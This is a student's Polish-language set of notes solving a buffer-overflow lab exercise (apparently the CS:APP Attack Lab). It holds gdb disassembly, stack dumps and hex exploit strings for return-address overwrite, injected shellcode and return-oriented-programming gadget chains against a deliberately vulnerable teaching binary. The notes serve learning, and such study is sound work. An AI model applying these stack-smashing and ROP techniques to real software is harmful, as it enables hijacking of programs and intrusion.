zad 1,2,3 na ctarget

# zad 1
Byte ordering - Little Endian - LSB jako pierwszy
gdb --args ./ctarget -q

Dump of assembler code for function test:
   0x0000000000401cc2 <+0>:	sub    $0x8,%rsp
   0x0000000000401cc6 <+4>:	mov    $0x0,%eax
   0x0000000000401ccb <+9>:	callq  0x401b3b <getbuf>
   0x0000000000401cd0 <+14>:	mov    %eax,%esi
   0x0000000000401cd2 <+16>:	lea    0x16ff(%rip),%rdi        # 0x4033d8
   0x0000000000401cd9 <+23>:	mov    $0x0,%eax
   0x0000000000401cde <+28>:	callq  0x4010b0 <printf@plt>
   0x0000000000401ce3 <+33>:	add    $0x8,%rsp
   0x0000000000401ce7 <+37>:	retq   
End of assembler dump.

Dump of assembler code for function getbuf:
   0x0000000000401b3b <+0>:	sub    $0x18,%rsp		# -> 24 bajty bufer
   0x0000000000401b3f <+4>:	mov    %rsp,%rdi
   0x0000000000401b42 <+7>:	callq  0x401d8a <Gets>
   0x0000000000401b47 <+12>:	mov    $0x1,%eax
   0x0000000000401b4c <+17>:	add    $0x18,%rsp
   0x0000000000401b50 <+21>:	retq   
End of assembler dump.


Dump of assembler code for function touch1:
    <+0>:	sub    $0x8,%rsp
   0x0000000000401b55 <+4>:	movl   $0x1,0x49a1(%rip)        # 0x406500 <vlevel>
   0x0000000000401b5f <+14>:	lea    0x17ae(%rip),%rdi        # 0x403314
   0x0000000000401b66 <+21>:	callq  0x401080 <puts@plt>
   0x0000000000401b6b <+26>:	mov    $0x1,%edi
   0x0000000000401b70 <+31>:	callq  0x401e84 <validate>
   0x0000000000401b75 <+36>:	mov    $0x0,%edi
   0x0000000000401b7a <+41>:	callq  0x4011f0 <exit@plt>

Chcemy z getbufa skoczyć do touch
więc musimy nadpisać w getbuf adres powrotu do test (0x0000000000401cc2 + 14 = 0x0000000000401cd0)
przy pomocy adresu do touch1 (0x0000000000401b51)
Sprawdzę jeszcze gdzie zaczyna się napis w getbuf

Po wykonaniu Gets w getbuf (input - "test"):
>>> x/32xb $rsp
0x5560a468:	0x74	0x65	0x73	0x74	0x00	0x00	0x00	0x00
0x5560a470:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5560a478:	0x00	0x60	0x58	0x55	0x00	0x00	0x00	0x00
0x5560a480:	0xd0	0x1c	0x40	0x00	0x00	0x00	0x00	0x00

Czyli potrzeba 24 bajty paddingu i w little endian adres touch: 
0x55	0x1b	0x40	0x00	0x00	0x00	0x00	0x00

./hex2raw < phase1.txt > phase1_r.txt

hd phase1_r.txt 
00000000  77 77 77 77 77 77 77 77  77 77 77 77 77 77 77 77  |wwwwwwwwwwwwwwww|
00000010  77 77 77 77 77 77 77 77  55 1b 40 00 00 00 00 00  |wwwwwwwwU.@.....|
00000020  0a                                                |.|

niby rzuca błąd ale podobno jest ok -> 1 punkt

# zad 2
touch2 wczytuje przez %rdi cookie u mnie: 0x64d4c372

Dump of assembler code for function touch2:
   0x0000000000401b7f <+0>:	sub    $0x8,%rsp
   0x0000000000401b83 <+4>:	mov    %edi,%esi
   0x0000000000401b85 <+6>:	movl   $0x2,0x4971(%rip)        # 0x406500 <vlevel>
   0x0000000000401b8f <+16>:	cmp    %edi,0x4973(%rip)        # 0x406508 <cookie>
   0x0000000000401b95 <+22>:	je     0x401bbc <touch2+61>
   0x0000000000401b97 <+24>:	lea    0x17c2(%rip),%rdi        # 0x403360
   0x0000000000401b9e <+31>:	mov    $0x0,%eax
   0x0000000000401ba3 <+36>:	callq  0x4010b0 <printf@plt>
   0x0000000000401ba8 <+41>:	mov    $0x2,%edi
   0x0000000000401bad <+46>:	callq  0x401f42 <fail>
   0x0000000000401bb2 <+51>:	mov    $0x0,%edi
   0x0000000000401bb7 <+56>:	callq  0x4011f0 <exit@plt>
   0x0000000000401bbc <+61>:	lea    0x1775(%rip),%rdi        # 0x403338
   0x0000000000401bc3 <+68>:	mov    $0x0,%eax
   0x0000000000401bc8 <+73>:	callq  0x4010b0 <printf@plt>
   0x0000000000401bcd <+78>:	mov    $0x2,%edi
   0x0000000000401bd2 <+83>:	callq  0x401e84 <validate>
   0x0000000000401bd7 <+88>:	jmp    0x401bb2 <touch2+51>
   
 przed Gets
 >>> x/16xg $rsp-8
0x5560a460:	0x0000000000000000	0x0000000000000000
0x5560a470:	0x0000000000000000	0x0000000055586000
0x5560a480:	0x0000000000401cd0	0x0000000000000009
0x5560a490:	0x0000000000402101	0x0000000000000000
0x5560a4a0:	0xf4f4f4f4f4f4f4f4	0xf4f4f4f4f4f4f4f4
0x5560a4b0:	0xf4f4f4f4f4f4f4f4	0xf4f4f4f4f4f4f4f4
0x5560a4c0:	0xf4f4f4f4f4f4f4f4	0xf4f4f4f4f4f4f4f4
0x5560a4d0:	0xf4f4f4f4f4f4f4f4	0xf4f4f4f4f4f4f4f4

po Gets
>>> x/16xg $rsp-8
0x5560a460:	0x0000000000401b47	0x00676e6974736574
0x5560a470:	0x0000000000000000	0x0000000055586000
0x5560a480:	0x0000000000401cd0	0x0000000000000009
0x5560a490:	0x0000000000402101	0x0000000000000000
0x5560a4a0:	0xf4f4f4f4f4f4f4f4	0xf4f4f4f4f4f4f4f4
0x5560a4b0:	0xf4f4f4f4f4f4f4f4	0xf4f4f4f4f4f4f4f4
0x5560a4c0:	0xf4f4f4f4f4f4f4f4	0xf4f4f4f4f4f4f4f4
0x5560a4d0:	0xf4f4f4f4f4f4f4f4	0xf4f4f4f4f4f4f4f4

adres touch2: 0x0000000000401b7f
little endian 7f 1b 40 00 00 00 00 00

>>> x/s $rsp
0x5560a468:	"testing"

movq    $0x64d4c372, %rdi
ret

Disassembly of section .text:
0000000000000000 <.text>:
   0:	48 c7 c7 72 c3 d4 64 	mov    $0x64d4c372,%rdi
   7:	c3                   	retq   

Rozwiązanie
48 c7 c7 72 c3 d4 64 c3 /* movq $cookie, %rdi */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* padding do 24 */
68 a4 60 55 00 00 00 00 /* adres początku napisu, który napisuje adres powrotu (adres instrukcji movq)*/
7f 1b 40 00 00 00 00 00 /* adres touch2, który jest "nad" poprzednim*/

## zad 3
>>> disass touch3 
Dump of assembler code for function touch3:
   0x0000000000401c5a <+0>:	push   %rbx
   0x0000000000401c5b <+1>:	mov    %rdi,%rbx
   0x0000000000401c5e <+4>:	movl   $0x3,0x4898(%rip)        # 0x406500 <vlevel>
   0x0000000000401c68 <+14>:	mov    %rdi,%rsi
   0x0000000000401c6b <+17>:	mov    0x4897(%rip),%edi        # 0x406508 <cookie>
   0x0000000000401c71 <+23>:	callq  0x401bd9 <hexmatch>
   0x0000000000401c76 <+28>:	test   %eax,%eax
   0x0000000000401c78 <+30>:	je     0x401ca2 <touch3+72>
   0x0000000000401c7a <+32>:	mov    %rbx,%rsi
   0x0000000000401c7d <+35>:	lea    0x1704(%rip),%rdi        # 0x403388
   0x0000000000401c84 <+42>:	mov    $0x0,%eax
   0x0000000000401c89 <+47>:	callq  0x4010b0 <printf@plt>
   0x0000000000401c8e <+52>:	mov    $0x3,%edi
   0x0000000000401c93 <+57>:	callq  0x401e84 <validate>
   0x0000000000401c98 <+62>:	mov    $0x0,%edi
   0x0000000000401c9d <+67>:	callq  0x4011f0 <exit@plt>
   0x0000000000401ca2 <+72>:	mov    %rbx,%rsi
   0x0000000000401ca5 <+75>:	lea    0x1704(%rip),%rdi        # 0x4033b0
   0x0000000000401cac <+82>:	mov    $0x0,%eax
   0x0000000000401cb1 <+87>:	callq  0x4010b0 <printf@plt>
   0x0000000000401cb6 <+92>:	mov    $0x3,%edi
   0x0000000000401cbb <+97>:	callq  0x401f42 <fail>
   0x0000000000401cc0 <+102>:	jmp    0x401c98 <touch3+62>
End of assembler dump.

Dump of assembler code for function hexmatch:
   0x0000000000401bd9 <+0>:	push   %r12
   0x0000000000401bdb <+2>:	push   %rbp
   0x0000000000401bdc <+3>:	push   %rbx
   0x0000000000401bdd <+4>:	sub    $0x70,%rsp
   0x0000000000401be1 <+8>:	mov    %edi,%ebp
   0x0000000000401be3 <+10>:	mov    %rsi,%rbx
   0x0000000000401be6 <+13>:	callq  0x401160 <random@plt>
   0x0000000000401beb <+18>:	mov    %rax,%rcx
   0x0000000000401bee <+21>:	movabs $0xa3d70a3d70a3d70b,%rdx
   0x0000000000401bf8 <+31>:	imul   %rdx
   0x0000000000401bfb <+34>:	add    %rcx,%rdx
   0x0000000000401bfe <+37>:	sar    $0x6,%rdx
   0x0000000000401c02 <+41>:	mov    %rcx,%rax
   0x0000000000401c05 <+44>:	sar    $0x3f,%rax
   0x0000000000401c09 <+48>:	sub    %rax,%rdx
   0x0000000000401c0c <+51>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000401c10 <+55>:	lea    (%rax,%rax,4),%rdx
   0x0000000000401c14 <+59>:	lea    0x0(,%rdx,4),%rax
   0x0000000000401c1c <+67>:	sub    %rax,%rcx
   0x0000000000401c1f <+70>:	lea    (%rsp,%rcx,1),%r12
   0x0000000000401c23 <+74>:	mov    %ebp,%edx
   0x0000000000401c25 <+76>:	lea    0x1705(%rip),%rsi        # 0x403331
   0x0000000000401c2c <+83>:	mov    %r12,%rdi
   0x0000000000401c2f <+86>:	mov    $0x0,%eax
   0x0000000000401c34 <+91>:	callq  0x4011e0 <sprintf@plt>
   0x0000000000401c39 <+96>:	mov    $0x9,%edx
   0x0000000000401c3e <+101>:	mov    %r12,%rsi
   0x0000000000401c41 <+104>:	mov    %rbx,%rdi
   0x0000000000401c44 <+107>:	callq  0x401060 <strncmp@plt>
   0x0000000000401c49 <+112>:	test   %eax,%eax
   0x0000000000401c4b <+114>:	sete   %al
   0x0000000000401c4e <+117>:	movzbl %al,%eax
   0x0000000000401c51 <+120>:	add    $0x70,%rsp
   0x0000000000401c55 <+124>:	pop    %rbx
   0x0000000000401c56 <+125>:	pop    %rbp
   0x0000000000401c57 <+126>:	pop    %r12
   0x0000000000401c59 <+128>:	retq   

adres touch3
0x0000000000401c5a
5a 1c 40 00 00 00 00 00

movq    $0x5560A488, %rdi	# rdi to adres cookie
pushq   $0x0000000000401c5a    #   
retq

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 88 a4 60 55 	mov    $0x5560a488,%rdi
   7:	68 5a 1c 40 00       	pushq  $0x401c5a
   c:	c3                   	retq   
   
budujemy na podstawie zad 2:
Wizualizacja ramki stosu getbuf:
undef                 -> cookie jako string
undef                 -> adres touch3
adres powrotu do test -> adres początku inputu
buf                   -> padding
buf                   -> padding
buf(poczatek inputu)  -> movq %rsp+48, %rdi (rdi to adres cookie)

początek inputu: 0x5560a468 = 68 a4 60 55 00 00 00 00
adres cookie: 0x5560a468 + 0x20 = 0x5560A488
adres touch3 (little endian): 5a 1c 40 00 00 00 00 00
instrukcja: 48 c7 c7 90 a4 60 55 c3
cookie: 36 34 64 34 63 33 37 32

48 c7 c7 88 a4 60 55 /* instrukcja mov */
68 5a 1c 40 00       /* instrukcja push */
c3 		      /* instrukcja push */
00 00 00
00 00 00 00 00 00 00 00 /* padding */
68 a4 60 55 00 00 00 00 /* początek input */
36 34 64 34 63 33 37 32 /* cookie jako string */

48 c7 c7 90 a4 60 55 c3 /* instrukcja */
00 00 00 00 00 00 00 00 /* padding */
00 00 00 00 00 00 00 00 /* padding */
68 a4 60 55 00 00 00 00 /* początek input */
5a 1c 40 00 00 00 00 00 /* touch3 */
36 34 64 34 63 33 37 32 /* cookie jako string */

## zad 4
0x64d4c372 - cookie
dwa gadgety - movq, popq, ret
0000000000401b7f - adres touch2 (7f 1b 40 00 00 00 00 00)

gadget 1 -> popq %rax (zdejmuje ze stosu cookie)
gadget 2 -> movq %rdi, %rax (umieszcza cookie w rax)

0000000000401d07 <getval_283>:
  401d07:	b8 58 90 90 c3       	mov    $0xc3909058,%eax         # popq %rax | nop
  401d0c:	c3                   	retq
gadget1: 0x0000000000401d07 + 0x1 = 0x0000000000401d08 (08 1d 40 00 00 00 00 00)

0000000000401d14 <getval_351>:
  401d14:	b8 3f 48 89 c7       	mov    $0xc789483f,%eax         # (q) %rdi <- %rax
  401d19:	c3                   	retq
gadget2: 0x0000000000401d14 + 0x2 = 0x0000000000401d16 (16 1d 40 00 00 00 00 00)

Idea chcemy zrobić ramkę stosu:
-----------
adres touch (adres wykorzystanu przez rat, gadgetu 2)
gadget 2 (adres wykorzystany przez ret, gadgetu 1)
cookie
gadget 1
padding
-----------
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 24 bajty paddingu */
08 1d 40 00 00 00 00 00 /* adres gadget 1 */
72 c3 d4 64 00 00 00 00 /* cookie */
16 1d 40 00 00 00 00 00 /* adres gadget 2 */
7f 1b 40 00 00 00 00 00 /* adres touch2 */

## zad 5
Mamy:
adres touch3: 0x0000000000401c5a (5a 1c 40 00 00 00 00 00)
cookie jako string: (36 34 64 34 63 33 37 32)

Dostępne gadgety:
rax <- 1 (eax <- 1)
rax <- rdi + rsi 	 (27 1d 40 00 00 00 00 00)
rax <- rsp (eax <- esp) (42 1d 40 00 00 00 00 00)
popq %rax 		 (08 1d 40 00 00 00 00 00)
rdi <- rax (edi <- eax) (16 1d 40 00 00 00 00 00)
ecx <- eax 	 	 (d6 1d 40 00 00 00 00 00)
edx <- ecx              (2f 1d 40 00 00 00 00 00)	 
esi <- edx              (70 1d 40 00 00 00 00 00)

Jaki jest problem?
Chcemy umieścić adres cookie który jest nad ramką stosu w %rdi
Ale ten adres się zmienia więc nie da się zrobić (przez ASLR) - 0x5560a468 + 0x20 = 0x5560A488
gdzie 0x5560a468 to był adres %rsp

Ale możemy zrobić obliczenie (%rsp + odległość do cookie) przy pomocy tego lea (rdi + rsi)

rax <- rsp (zapisujemy adres, który był adresem powrotu z getbuf w rdi)
rdi <- rax
popq %rax (do rax zapisujemy odległość) 
odległość (z gdb: x/xg $rsp+0x48 to cookie, przy rax <- rsp)
ecx <- eax (teraz chcemy do rdi dodać tę odległość)
edx <- ecx
esi <- edx (teraz esi == eax)
rax <- rdi + rsi (to jest (%rsp + odleglosc))
rdi <- rax
touch3
cookie

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 24 bajty paddingu */
42 1d 40 00 00 00 00 00 /* rax <- rsp */
16 1d 40 00 00 00 00 00
08 1d 40 00 00 00 00 00
48 00 00 00 00 00 00 00
d6 1d 40 00 00 00 00 00
2f 1d 40 00 00 00 00 00 /* edx <- ecx */
70 1d 40 00 00 00 00 00
27 1d 40 00 00 00 00 00
16 1d 40 00 00 00 00 00
5a 1c 40 00 00 00 00 00
36 34 64 34 63 33 37 32

>>> x/xg $rsp
0x7ffffffcb7c8:	0x0000000000401d77



